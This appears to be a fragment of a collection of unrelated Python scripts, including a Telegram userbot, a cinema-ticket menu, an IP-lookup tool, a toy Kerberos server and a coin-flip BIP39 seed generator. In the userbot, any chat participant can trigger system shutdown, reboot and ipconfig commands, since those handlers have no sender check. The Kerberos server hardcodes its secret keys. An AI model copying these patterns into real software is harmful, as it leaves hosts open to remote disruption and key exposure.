input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0448 API HASH: \")\n\n    # \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u0432 \u0444\u0430\u0439\u043b\n    with open(file_path, 'w') as file:\n        file.write(api_id + \"\\n\" + api_hash)\n\n# \u0412\u0430\u0448 \u0442\u043e\u043a\u0435\u043d \u0434\u043b\u044f \u0431\u043e\u0442\u0430 Pyrogram\napp = Client(\"my_bot\", api_id=api_id, api_hash=api_hash)\n            \n@app.on_message(filters.command(\"readall\", prefixes=\".\") & filters.me)\nasync def read_all_messages(client, message):\n    # Inform the user that the process has started.\n    await message.edit(\"\u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u0439...\")\n    \n    async for dialog in app.get_dialogs():\n        await app.read_chat_history(dialog.chat.id)\n    \n    # Edit the message after all chats have been marked as read.\n    await message.edit(\"\u0412\u0441\u0435 \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u044f \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u043d\u044b!\")\n\n@app.on_message(filters.command(\"off\", prefixes=\".\"))\ndef turn_off_pc(client, message):\n    os.system(\"shutdown /s /t 0\")\n    client.edit_message_text(message.chat.id, message.message_id, \"\u041a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440 \u0431\u0443\u0434\u0435\u0442 \u0432\u044b\u043a\u043b\u044e\u0447\u0435\u043d.\")\n    \n@app.on_message(filters.command(\"connet\", prefixes=\".\"))\ndef ipconfig_command(client, message):\n    # Execute the 'ipconfig' command and decode the output from cp866 encoding to Unicode\n    ipconfig_output = subprocess.check_output(\"ipconfig\", shell=True).decode(\"cp866\")\n    \n    # Create a formatted version of the IP configuration output\n    formatted_output = \"\"\"\n\u2699\ufe0f Network Configuration:\n\n{}\n\"\"\".format(ipconfig_output).strip()\n\n    if message.reply_to_message:\n        # Edit the original message with the formatted output\n        client.edit_message_text(\n            chat_id=message.chat.id,\n            message_id=message.reply_to_message.message_id,\n            text=formatted_output\n        )\n    else:\n        # Send a new message with the formatted output\n        sent_message = client.send_message(\n            chat_id=message.chat.id,\n            text=formatted_output\n        )\n    \n@app.on_message(filters.command(\"res\", prefixes=\".\"))\ndef reboot_pc(client, message):\n    os.system(\"shutdown /r /t 0\")\n    client.edit_message_text(message.chat.id, message.message_id, \"\u041a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440 \u0431\u0443\u0434\u0435\u0442 \u043f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0436\u0435\u043d.\")  \n        \n@app.on_message(filters.command(\"leto\", prefixes=\".\"))\ndef count_down_to_summer(client, message: Message):\n    summer_date = datetime(datetime.now().year, 6, 1, 0, 0, 0, tzinfo=pytz.utc)  # \u0412\u0440\u0435\u043c\u044f \u043d\u0430\u0447\u0430\u043b\u0430 \u043b\u0435\u0442\u0430 \u0441 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0435\u0439 \u043e \u0441\u043c\u0435\u0449\u0435\u043d\u0438\u0438 \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0437\u043e\u043d\u044b (UTC)\n    \n    if datetime.now(tz=pytz.utc) > summer_date:\n        summer_date",
    "#Genre List\r\ngenre = ['Action', 'Horror']\r\n\r\n#Database List Film Action\r\naction = [\r\n    {\"Judul Film\": \"Blade Runner 2049\", \"Tahun\": 2017, \"Genre\": \"Action, Fiction\", \"Sutradara\": \"Luke Scott\", \"Durasi\" : \"163 Menit\", \"tiket\" : \"Rp 35.000\"},\r\n    {\"Judul Film\": \"Everything Everywhere All at Once\", \"Tahun\": 2023, \"Genre\": \"Action, Fiction\", \"Sutradara\": \"Daniel Kwan\", \"Durasi\" : \"140 Menit\", \"tiket\" : \"Rp 35.000\"},\r\n    {\"Judul Film\": \"Inception\", \"Tahun\": 2010, \"Genre\": \"Action,Fiction\", \"Sutradara\": \"Christopher Nolan\", \"Durasi\" : \"148 Menit\",\"tiket\" : \"Rp 45.000\"}]\r\nhorror = [\r\n    {\"Judul Film\": \"Get Out\", \"Tahun\": 2017, \"Genre\": \"Horror, Thriller\", \"Sutradara\": \"Jordan Pelee\", \"Durasi\" : \"104 Menit\", \"tiket\" : \"Rp 50.000\"},\r\n    {\"Judul Film\": \"A Quiet Place\", \"Tahun\": 2018, \"Genre\": \"Horror\", \"Sutradara\": \"John Krasinski\", \"Durasi\" : \"90  Menit\", \"tiket\" : \"Rp 40.000\"},\r\n    {\"Judul Film\": \"The LightHouse\", \"Tahun\": 2019, \"Genre\": \"Psychological, Horror\", \"Sutradara\": \"Robert Eggers\", \"Durasi\" : \"110 Menit\", \"tiket\" : \"Rp 45.000\"}]\r\n\r\n#Database Film action:\r\naction1 = {\"Judul Film\": \"Blade Runner 2049\", \"Tahun\": 2017, \"Genre\": \"Action, Fiction\", \"Sutradara\": \"Luke Scott\", \"Durasi\" : \"163 Menit\", \"tiket\" : \"Rp 35.000\"}\r\naction2 = {\"Judul Film\": \"Everything Everywhere All at Once\", \"Tahun\": 2023, \"Genre\": \"Action, Fiction\", \"Sutradara\": \"Daniel Kwan\", \"Durasi\" : \"140 Menit\", \"tiket\" : \"Rp 35.000\"}\r\naction3 = {\"Judul Film\": \"Inception\", \"Tahun\": 2010, \"Genre\": \"Action,Fiction\", \"Sutradara\": \"Christopher Nolan\", \"Durasi\" : \"148 Menit\",\"tiket\" : \"Rp 45.000\"}\r\n\r\n#Database Film Horror\r\nhorror1 = {\"Judul Film\": \"Get Out\", \"Tahun\": 2017, \"Genre\": \"Horror, Thriller\", \"Sutradara\": \"Jordan Pelee\", \"Durasi\" : \"104 Menit\", \"tiket\" : \"Rp 50.000\"}\r\nhorror2 = {\"Judul Film\": \"A Quiet Place\", \"Tahun\": 2018, \"Genre\": \"Horror\", \"Sutradara\": \"Daniel Kwan\", \"Durasi\" : \"90 Menit\", \"tiket\" : \"Rp 40.000\"}\r\nhorror3 = {\"Judul Film\": \"The LightHouse\", \"Tahun\": 2019, \"Genre\": \"Psychological, Horror\", \"Sutradara\": \"Robert Eggers\", \"Durasi\" : \"110 Menit\", \"tiket\" : \"Rp 45.000\"}\r\n\r\n#Theater Random Generate\r\nimport random\r\ntheater_number = random.randint(1,6)\r\n\r\n#Invoicefilm_action = \r\ninvoice_action1 = f\"\"\"\r\n    Judul film : {action1['Judul Film']}\r\n    Tahun      : {action1['Tahun']}\r\n    Genre      : {action1['Genre']}\r\n    Durasi     : {action1['Durasi']}\r\n    Harga      : {action1['tiket']}\r\n    Date       : Rabu, 3 April 2024, 14:35 - 17:55\r\n    Theater    : {theater_number}\"\"\"\r\ninvoice_action2 = f\"\"\"\r\n    Judul film : {action2['Judul Film']}\r\n    Tahun      : {action2['Tahun']}\r\n    Genre      : {action2['Genre']}\r\n    Durasi     : {action2['Durasi']}\r\n    Harga      : {action2['tiket']}\r\n    Date       : Minggu, 7 April 2024, 20:00 - 23:00\r\n    Theater    : {theater_number}\"\"\"\r\ninvoice_action3 = f\"\"\"\r\n    Judul film : {action3['Judul Film']}\r\n    Tahun      : {action3['Tahun']}\r\n    Genre      : {action3['Genre']}\r\n    Durasi     : {action3['Durasi']}\r\n    Harga      : {action3['tiket']}\r\n    Date       : Selasa, 9 April 2024, 12:30 - 14:50\r\n    Theater    : {theater_number}\"\"\"\r\n\r\ninvoice_horror1 = f\"\"\"\r\n    Judul film : {horror1['Judul Film']}\r\n    Tahun      : {horror1['Tahun']}\r\n    Genre      : {horror1['Genre']}\r\n    Durasi     : {horror1['Durasi']}\r\n    Harga      : {horror1['tiket']}\r\n    Date       : Rabu, 3 April 2024, 15:35 - 17:00\r\n    Theater    : {theater_number}\"\"\"\r\ninvoice_horror2 = f\"\"\"\r\n    Judul film : {horror2['Judul Film']}\r\n    Tahun      : {horror2['Tahun']}\r\n    Genre      : {horror2['Genre']}\r\n    Durasi     : {horror2['Durasi']}\r\n    Harga      : {horror2['tiket']}\r\n    Date       : Rabu, 3 April 2024, 13:00 - 14:30\r\n    Theater    : {theater_number}\"\"\"\r\ninvoice_horror3 = f\"\"\"\r\n    Judul film : {horror3['Judul Film']}\r\n    Tahun      : {horror3['Tahun']}\r\n    Genre      : {horror3['Genre']}\r\n    Durasi     : {horror3['Durasi']}\r\n    Harga      : {horror3['tiket']}\r\n    Date       : Rabu, 3 April 2024, 18:35 - 21:00\r\n    Theater    : {theater_number}\"\"\"\r\n\r\nwhile True:\r\n    print(23*'-')\r\n    print(\"====== SELAMAT DATANG DI BIOSKOP XLL ======\")\r\n    print(23*'-')\r\n    print(\"[1]. Pilih Film\")\r\n    print(\"[0]. Exit Program\")\r\n    print(\"-------------------------------------------\\n\")\r\n\r\n    pilihan = int(input(\"Masukkan Pilihan Anda : \"))\r\n\r\n    if pilihan == 1:\r\n        while pilihan != 0:\r\n            if pilihan == 1:\r\n                print(\"-------------------------------------------\")\r\n                print(\"============ DAFTAR GENRE FILM ============\")\r\n                print(\"-------------------------------------------\")\r\n\r\n                for genres in range(len(genre)):\r\n                    print(f\"{genres + 1}. {genre[genres]}\")\r\n                    print(\"------------------------------\")\r\n\r\n                pilihan_genre = int(input(\"Masukkan Pilihan Anda : \"))\r\n                if pilihan_genre == 1:\r\n                    print(\"\\nFilm yang sedang tayang\\n\")\r\n                    print(133*'-')\r\n   ",
    "css = '''\r\n<style>\r\n.chat-message {\r\n    padding: 1.5rem; border-radius: 0.5rem; margin-bottom: 1rem; display: flex\r\n}\r\n.chat-message.user {\r\n    background-color: #2b313e\r\n}\r\n.chat-message.bot {\r\n    background-color: #475063\r\n}\r\n.chat-message .avatar {\r\n  width: 20%;\r\n}\r\n.chat-message .avatar img {\r\n  max-width: 78px;\r\n  max-height: 78px;\r\n  border-radius: 50%;\r\n  object-fit: cover;\r\n}\r\n.chat-message .message {\r\n  width: 80%;\r\n  padding: 0 1.5rem;\r\n  color: #fff;\r\n}\r\n'''\r\n\r\nbot_template = '''\r\n<div class=\"chat-message bot\">\r\n    <div class=\"avatar\">\r\n        <img src=\"https://i.ibb.co/cN0nmSj/Screenshot-2023-05-28-at-02-37-21.png\" style=\"max-height: 78px; max-width: 78px; border-radius: 50%; object-fit: cover;\">\r\n    </div>\r\n    <div class=\"message\">{{MSG}}</div>\r\n</div>\r\n'''\r\n\r\nuser_template = '''\r\n<div class=\"chat-message user\">\r\n    <div class=\"avatar\">\r\n        <img src=\"https://i.ibb.co/rdZC7LZ/Photo-logo-1.png\">\r\n    </div>    \r\n    <div class=\"message\">{{MSG}}</div>\r\n</div>\r\n'''",
    "import numpy as np\nimport matplotlib.pyplot as plt\n\"\"\"\nThis script is used to create a pulsar pattern for the Conway's game of life.\nThe board is a 3D numpy array with the following shape: (x, y, 1). The first two dimensions represent the region \nwhere the gun is drawn and the third dimension stores the state (alife or dead).\nThe pattern itself was generated by ChatGPT\nThe function returns the glider gun and is used in the main program upon calling the draw_pattern function.\nThe function must be called \"create_pattern\" and must return the array with the pattern in order to be used.\n\"\"\"\n\ndef create_pattern(): #initiation done by chatGPT\n    size = 15\n    pulsar = np.zeros((size, size), dtype=int)\n\n    # Coordinates for the pulsar pattern\n    pulsar_coords = [(1, 4), (1, 5), (1, 6), (1, 10), (1, 11), (1, 12),\n                     (3, 2), (3, 7), (3, 9), (3, 14),\n                     (4, 2), (4, 7), (4, 9), (4, 14),\n                     (5, 2), (5, 7), (5, 9), (5, 14),\n                     (6, 4), (6, 5), (6, 6), (6, 10), (6, 11), (6, 12),\n                     (8, 4), (8, 5), (8, 6), (8, 10), (8, 11), (8, 12),\n                     (9, 2), (9, 7), (9, 9), (9, 14),\n                     (10, 2), (10, 7), (10, 9), (10, 14),\n                     (11, 2), (11, 7), (11, 9), (11, 14),\n                     (13, 4), (13, 5), (13, 6), (13, 10), (13, 11), (13, 12)]\n\n    # Set pulsar pattern cells to 1\n    for x, y in pulsar_coords:\n        pulsar[x, y] = 1\n    #print ('pulsar created')\n    return pulsar\n\n\n",
    "import requests  as reqs \nimport socket , time \nfrom colorama import Fore , init\nimport sys\nfrom scapy.all import ARP, Ether, srp\ninit()\n\na1 = \"                          \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2584\u2584\u2584\u2584\u2584\u2588\u2588\u2557\u2584\u2584\u2584\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\\n \"\na2 = \"                          \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2591\u2588\u2591\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2591\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2584\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\\n \"\na3 = \"                          \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2580\u2584\u2580\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2591\u2588\u2588\u2551\u2588\u2591\u2588\u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2591\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2580\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\\n \"\na4 = \"                          \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d\u2588\u2584\u2588\u2584\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2591\u2588\u2588\u2551\u2588\u2584\u2584\u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2584\u2588\u2588\u2588\u2551\u2588\u2588\u2551\u2584\u2588\u2584\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\\n \"\na5 = \"                          \u2588\u2588\u2551\u2588\u2588\u2551\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\\n \"\na6 = \"                          \u255a\u2550\u255d\u255a\u2550\u255d         \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\"\ncredit = \"------  [+] Tool by @Eyad156 or Driplay -------\\n\"\n\nasciiart = a1 + a2 + a3 + a4 + a5 + a6\nprint(Fore.GREEN + \"\\n\",asciiart)\nprint(Fore.LIGHTBLUE_EX + \"\\n\",credit)\n\ntry: \n    ip = socket.gethostbyname(\"www.google.com\")\n    print(Fore.LIGHTGREEN_EX + \"# Internet : Active\")    \nexcept Exception as e:\n    \n    print(Fore.LIGHTRED_EX + \"  !!No Internet !! \\nExitting in 10 seconds\")  \n    time.sleep(10)\n    exit()\nprint(Fore.LIGHTCYAN_EX + \"\")\nurl = \"https://ipinfo.io\"\nprint(\"1. Check your ip info \")\nprint(\"2. Check somene's ip info \")\nprint(\"3. Get ip of web  \\n\")\n\nchoice = input(\"Choice (1 or 2 or 3) > \")\n\nif choice == \"1\":\n    print(Fore.LIGHTBLUE_EX + \"\\n****Your Ip Info****\\n\")\n    resp = reqs.get(url)\n    alldata = resp.json()\n    \n    IP = alldata.get('ip')\n    CT = alldata.get('city')\n    RG = alldata.get('region')\n    CY = alldata.get('country')\n    LOC = alldata.get('loc')\n    POS = alldata.get('postal')\n    TZ = alldata.get('timezone')\n    \n    print(Fore.LIGHTCYAN_EX + \"IP Address :\",IP)\n    print(\"City :\",CT)\n    print(\"Region :\",RG)\n    print(\"Country :\",CY)\n    print(\"Location :\",LOC)\n    print(\"Postal Code :\",POS)\n    print(\"Time Zone :\",TZ)\n\nelif choice == \"2\":\n    print(Fore.LIGHTBLUE_EX + \"\\n***Someone's Ip Info****\\n\")\n    Sip = input(\"Enter ip address : \")\n    url = url+\"/\"+Sip\n    \n    resp = reqs.get(url)\n    alldata = resp.json()\n    \n    IP = alldata.get('ip')\n    CT = alldata.get('city')\n    RG = alldata.get('region')\n    CY = alldata.get('country')\n    LOC = alldata.get('loc')\n    POS = alldata.get('postal')\n    TZ = alldata.get('timezone')\n    \n    print(Fore.LIGHTCYAN_EX + \"\\nIP Address :\",IP)\n    print(\"City :\",CT)\n    print(\"Region :\",RG)\n    print(\"Country :\",CY)\n    print(\"Location :\",LOC)\n    print(\"Postal Code :\",POS)\n    print(\"Time Zone :\",TZ)\nelif choice == '3':\n    enter_name = input(Fore.YELLOW + \"Enter name of website -> \")\n    get = socket.gethostbyname(enter_name)\n    print(Fore.WHITE+f\"Ip of {get} : \"+Fore.LIGHTGREEN_EX +get)\n# elif choice == '4':\nelse:\n    print(\"Invalid choice , input 1 or 2\")    \n\n\n\ninput(Fore.RED + \"Exit > \")\nsys.exit()",
    "from typing import List, Tuple\n\ndef required_kernel(in_size: int, out_size:int, stride=1, padding=1):\n    assert in_size > 0, \"Input size must be greater than 0\"\n    assert out_size > 0, \"Output size must be greater than 0\"\n    assert in_size >= out_size, \"Input size must be greater than or equal to output size\"\n    assert stride > 0, \"Stride must be greater than 0\"\n    assert padding >= 0, \"Padding must be greater than or equal to 0\"\n    \n    return (1-out_size)*stride+in_size+2*padding\n\ndef convert_to_int(input_list):\n    result = []\n    for item in input_list:\n        if isinstance(item, list):\n            result.append(convert_to_int(item))\n        elif item.isdigit():  # Check if the string represents a number\n            result.append(int(item))\n        else:\n            result.append(item)\n    return result\n\ndef create_dictionary(keys, values):\n    return dict(zip(map(tuple, keys), values))\n\ndef bi_operator(op, a, b):\n    if op == '==':\n        \n        return a == b\n    elif op == '!=':\n        return a != b\n    elif op == '>':\n        return a > b\n    elif op == '>=':\n        return a >= b\n    elif op == '<':\n        return a < b\n    elif op == '<=':\n        return a <= b\n    elif callable(op):\n        return op(a, b)\n    \ndef intersect_dicts(dict1, dict2):\n    intersection_dict = {}\n    for key in dict1.keys() & dict2.keys():  # Using set intersection for keys\n        if dict1[key] == dict2[key]:  # Ensure values are the same for the common key\n            intersection_dict[key] = dict1[key]\n    return intersection_dict\n\ndef union_dicts(dict1, dict2):\n    return {**dict1, **dict2}\n\ndef is_instance_of(obj, class_names: List[type]):\n    return any(isinstance(obj, class_name) for class_name in class_names)\n",
    "\"\"\"Este archivo constituye el MODELO de la aplicacion.\"\"\"\n\n# Se importan las librerias necesarias.\nimport matplotlib.pyplot as plt\nimport os\nimport re\nimport tkinter as tk\nfrom PIL import ImageTk, Image\nimport numpy as np\nimport glob\nfrom peewee import SqliteDatabase, Model, IntegerField, FloatField\nfrom datetime import datetime\n\n\n\"\"\"\nSe indican variables globales.\n\n:var ruta: Indica la ruta de \"modelo.py\".\n:var ruta_marcha: Indica la ruta de \"marcha.png\".\n:var ruta_base: Indica la ruta de \"mibase.db\".\n:var ruta_log: Umdica la ruta de \"log.txt\".\n:var hora_r: Indica la fecha y hora actual.\n:var db: Apunta a la Base de Datos.\n\nDescribe las rutas del grafico, de la base de datos y registro de errores.\n\"\"\"\nglobal ruta, ruta_marcha, ruta_base, ruta_log, hora_r, db\nruta = os.path.dirname((os.path.abspath(__file__)))\nruta_marcha = os.path.join(ruta,\n                        \"marcha.png\")\nruta_base = os.path.join(ruta,\n                        \"mibase.db\")\nruta_log = os.path.join(ruta,\n                        \"log.txt\")\nhora_r = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\ndb = SqliteDatabase(ruta_base)\n\n\nclass BaseModel(Model):\n    \"\"\"Se crea la Base de Datos.\"\"\"\n\n    class Meta:\n        \"\"\"\n        Se realiza la asignacion de la Base de Datos.\n        \n        :var database: Orientada a la Base de Datos.\n        \"\"\"\n        database = db\n\n\nclass Database(BaseModel):\n    \"\"\"\n    Se genera la tabla con sus campos y restricciones.\n    \n    :var hora: Guarda la hora en el campo homonimo de la tabla.\n    :var temperatura: Guarda la temperatura en el campo homonimo de la tabla.\n    \"\"\"\n\n    hora = IntegerField(unique=True)\n    temperatura = FloatField()\n\n\ndef conexion():\n    \"\"\"\n    Se verifica en el directorio si la base ya est\u00e1 creada o si hay que crearla.\n\n    :var files: busca en el directorio archivos con terminacion \".db\".\n\n    Se conecta/crea la base de datos y la tabla.\n    \"\"\"\n    files = glob.glob(ruta + '/*.db')\n    if files == []:\n        db.connect()\n        db.create_tables([Database])\n    else:\n        db.connect()\n\n\nclass Crud():\n    \"\"\"\n    Se realiza la clase y metodos que se utilizan desde Vista.\n\n    Se definen los metodos de alta, modificacion,\n    baja y consulta de registro. Adem\u00e1s del graficado de los datos.\n    \"\"\"\n\n    def alta(self, master, hora, temperatura):\n        \"\"\"\n        Se ingresa con los datos de hora y temperatura.\n        \n        :param master: Ventana de tkinter.\n        :param hora: Numero Natural que indica el horario en hora UTC.\n        :param temperatura: Numero Real que indica la tempratura de la hora.\n\n        Luego se verifica el formato,\n        se asigna al registro correspondiente,\n        y se acusa recibo por pantalla.\n\n        Si el formato no es correcto se informa al usuario por pantalla.\n        Si se detecta un error, se toma nota del mismo en un archivo de texto.\n        \"\"\"\n        try:\n            cadena_h = hora\n            cadena_t = temperatura\n            # Se define regex numerico,signo \"-\" y punto decimal \".\"\n            patron = \"^[0-9 \\. \\-]*$\"\n            if(re.match(patron, cadena_h) and re.match(patron, cadena_t)):\n                noti_exi = tk.Label(master,\n                                    text=\"\")\n                dato = Database()\n                dato.hora = int(hora)\n                dato.temperatura = float(temperatura)\n                dato.save()\n                noti_exi = tk.Label(master,\n                                    text=\"Alta \"+str(hora)+\" HOA: con exito.\")\n                noti_exi.place(x=20,\n                               y=570)\n            else:\n                print(\"Error en campo\\s hora y\\o temperatura\")\n        except:\n            with open(ruta_log, \"a\") as file:\n                file.write(hora_r+\". Existe valor de \"+str(hora)+\" UTC.\\n\")\n\n    def modificacion(self, master, hora, temperatura):\n        \"\"\"\n        Se ingresa con los datos de hora y temperatura.\n\n        :param master: Ventana de tkinter.\n        :param hora: Numero Natural que indica el horario en hora UTC.\n        :param temperatura: Numero Real que indica la tempratura de la hora.\n\n        Luego se verifica el formato,\n        se asigna al registro correspondiente,\n        y se acusa recibo por pantalla.\n\n        Si el formato no es correcto se informa al usuario por pantalla.\n        Si se detecta un error, se toma nota del mismo en un archivo de texto.\n        \"\"\"\n        try:\n            cadena_h = hora\n            cadena_t = temperatura\n            # Se define regex numerico,signo \"-\" y punto decimal \".\"\n            patron = \"^[0-9 \\. \\-]*$\"\n            if(re.match(patron, cadena_h) and re.match(patron, cadena_t)):\n                noti_exi = tk.Label(master,\n                                    text=\"\")\n                h = int(hora)\n                t = float(temperatura)\n                act = Database.update(hora=h,\n                                      temperatura=t).where(Database.hora == h)\n                act.execute()\n                noti_exi = tk.L",
    "import json\r\nimport socket\r\nfrom encrpt import encrypt_tgt_ticket\r\nfrom datetime import datetime, timedelta\r\n\r\ntgs_secret_key = b'739441c005031f1e41b0e60f52f11aa483d78d3c28fafbadd1b70c10a0fa4b9e'\r\n\r\nusername = \"\"\r\nuser_ip = \"\"\r\n\r\ntgs_name = \"TGS1\"\r\nlifetime_minutes = 5\r\ntgs_session_key = \"4fe4965433ff79c760ad0e8a50d8e5b3cd698ac2d39b80a98428b32716a08c4f\"\r\n\r\nKey = {\r\n    \"frey\": b'688d8c84d4fac20252eed935c2b6aad9e32a8615982cc0ca5f7f4f0050599e9e',\r\n    \"robin\": b'4898cd3c25683099efd6fc01b4c96d625d6872904d1b09e80912b921ecb18a8c'\r\n}\r\n\r\n\r\ndef create_ticket(tgs_name, lifetime_minutes, tgs_session_key, data_str):\r\n    global tgs_secret_key\r\n    data_dict = json.loads(data_str)\r\n    username = data_dict.get(\"username\")\r\n    user_secret_key = Key[username]\r\n\r\n    timestamp = datetime.now()\r\n    expiration_time = timestamp + timedelta(minutes=lifetime_minutes)\r\n    timestamp = timestamp.strftime(\"%Y-%m-%d %H:%M:%S\")\r\n\r\n    auth_ticket = {\r\n        \"TGS_name\": tgs_name,\r\n        \"Timestamp\": timestamp,\r\n        \"Lifetime\": expiration_time.strftime(\"%Y-%m-%d %H:%M:%S\"),\r\n        \"TGS_session_key\": tgs_session_key\r\n    }\r\n    encrypted_auth_ticket_base64 = encrypt_tgt_ticket(auth_ticket, user_secret_key)\r\n\r\n    tgt_ticket = {\r\n        \"Username\": username,\r\n        \"TGS_name\": tgs_name,\r\n        \"Timestamp\": timestamp,\r\n        \"User_IP_Address\": user_ip,\r\n        \"Lifetime\": expiration_time.strftime(\"%Y-%m-%d %H:%M:%S\"),\r\n        \"TGS_session_key\": tgs_session_key\r\n    }\r\n    encrypted_tgt_ticket_base64 = encrypt_tgt_ticket(tgt_ticket, tgs_secret_key)\r\n\r\n    return {\"AUTH_ticket\": encrypted_auth_ticket_base64, \"TGT_ticket\": encrypted_tgt_ticket_base64}\r\n\r\n\r\ndef Check_username(data_str):\r\n    try:\r\n        global username\r\n        data_dict = json.loads(data_str)\r\n        username = data_dict.get(\"username\")\r\n        if username in Key:\r\n            return True\r\n        else:\r\n            return False\r\n    except json.JSONDecodeError:\r\n        print(\"Invalid JSON format\")\r\n        return False\r\n\r\n\r\ndef Check_user_ip(data_str, addr):\r\n    try:\r\n        global user_ip\r\n        data_dict = json.loads(data_str)\r\n        user_ip = data_dict.get(\"ip_address\")\r\n        client_ip = addr[0]\r\n        if user_ip == client_ip:\r\n            return True\r\n        else:\r\n            return False\r\n    except json.JSONDecodeError:\r\n        print(\"Invalid JSON format\")\r\n        return False\r\n\r\n\r\ndef Check_timestamp(data_str):\r\n    try:\r\n        data_dict = json.loads(data_str)\r\n        timestamp_str = data_dict.get(\"timestamp\")\r\n\r\n        if not timestamp_str:\r\n            return False\r\n        timestamp = datetime.strptime(timestamp_str, \"%Y-%m-%d %H:%M:%S\")\r\n        current_time = datetime.now()\r\n        time_difference = abs(current_time - timestamp)\r\n        if time_difference <= timedelta(minutes=3):\r\n            return True\r\n        else:\r\n            return False\r\n    except json.JSONDecodeError:\r\n        print(\"Invalid JSON format\")\r\n        return False\r\n\r\n\r\ndef main():\r\n    host = 'localhost'\r\n    port = 12343\r\n\r\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:\r\n        server_socket.bind((host, port))\r\n        server_socket.listen(1)\r\n\r\n        print(\"Authentication server listening...\")\r\n        conn, addr = server_socket.accept()\r\n\r\n        with conn:\r\n            print(f\"Connected by {addr}\")\r\n            data = conn.recv(1024)\r\n            data_str = data.decode('utf-8')\r\n            print(\"\\nReceived data:\", data_str)\r\n\r\n            if Check_username(data_str) and Check_user_ip(data_str, addr) and Check_timestamp(data_str):\r\n                ticket = create_ticket(tgs_name, lifetime_minutes, tgs_session_key, data_str)\r\n                json_string = json.dumps(ticket)\r\n                conn.sendall(json_string.encode('utf-8'))\r\n                print(f\"\\nAuthorization Ticket sent (Reply): {json_string.encode('utf-8')}\")\r\n            else:\r\n                conn.sendall(b\"Authentication failed\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import requests\nfrom hashlib import sha256\n\ndef askquestion():\n    while True:\n        caracruz = str(input(\"\u00bfHas sacado 0 o 1? \"))\n        if caracruz == '0'or caracruz == '1':\n            break\n        else:\n            print(\"Por favor introduce 0 o 1.\")\n    return caracruz\n\nwordlist = requests.get('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\\n')\n\nseed = []\nmasterbinary =('')\n\nwhile len(seed)<11:\n    tiradas = 0\n    palabrabinary = \"\"\n    for i in range(11):\n        caracruz = askquestion()\n        palabrabinary += caracruz\n        tiradas += 1\n\n    #print(palabrabinary)\n    palabranumero = int(palabrabinary, 2) \n    #Convertimos de binario a decimal con el argumento 2\n    seed.append(wordlist[palabranumero])\n    #anadimos la palabra a la semilla\n\n    masterbinary += palabrabinary\n\n    #print(palabranumero +1)\n    print(wordlist[palabranumero])\n\n#print (len(seed))\n# print (f'tus primeras 11 palabras de la semilla son {seed}')\n#print (masterbinary)\n\nprint ('Ahora procederemos a la ultima palabra,para ello solamente podemos escoger 7 bytes')\n\ntiradasf = 0\nlastpalabrabinary = \"\"\nfor i in range(7):\n    caracruzf = askquestion()\n    lastpalabrabinary += caracruzf\n    tiradasf += 1\nmasterbinary += lastpalabrabinary\n\n#print (masterbinary)\n\nmasterbin=int(masterbinary,2)\n\nsha256hash = sha256(masterbin.to_bytes((masterbin.bit_length() + 7) // 8, 'big')).hexdigest()\n#este c\u00f3digo toma masterbin, lo convierte en una secuencia de bytes, calcula su hash SHA-256 y devuelve el hash en formato hexadecimal.\n#print(sha256hash)\n\n#Convertir de  hexa to binary. 